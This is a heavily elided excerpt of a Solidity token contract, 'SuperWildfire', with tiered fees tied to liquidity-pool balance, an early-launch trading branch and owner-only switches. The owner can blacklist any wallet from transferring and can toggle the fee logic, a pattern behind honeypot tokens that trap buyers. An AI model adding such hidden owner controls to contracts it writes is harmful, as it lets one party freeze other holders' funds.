...
contract SuperWildfire is Context, IERC20, Ownable {
    ...
    IERC20 public weth = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    uint256[4] public feeFomo = [1, 5, 8, 10];
    uint256[4] public feeLiquidity = [1, 3, 4, 5];
    uint256[4] public feeFee = [0, 0, 0, 0];
    ...
    function setLpReceiver(address _LpReceiver) public {
        require(_msgSender() == owner(), "fail");
        LpReceiver = _LpReceiver;
        _isExcludedFromFee[LpReceiver] = true;
    }
    ...
    function getHealthLevel() private view returns(uint256) {
        ...
        uint256 bal = weth.balanceOf(uniswapV2Pair);
        if (bal <= 50 * 10**18) {
            return 3;
        } else if (bal <= 100 * 10**18) {
            return 2;
        } else if (bal > 100 * 10**18) {
            return 1;
    ...
    function _transfer(
        ...
        require(!_BlackList[from], "Black List Wallet Address");
        require(!_BlackList[to], "Black List Wallet Address");
    ...
    function addLiquidityUsdt(uint256 tokenAmount, uint256 usdtAmount) private {
        ...
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        weth.approve(address(uniswapV2Router), usdtAmount);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        ...
        if (sender == uniswapV2Pair && recipient != owner()) {
            if (launchedAtTime + 6 > block.timestamp) {
    ...
    function setBlackListStatus(address wallet, bool starus) public onlyOwner{
        _BlackList[wallet] = starus;
    }
    
    function setFomoStatus(bool status) public onlyOwner{
        EnableFomo = status;
    }
}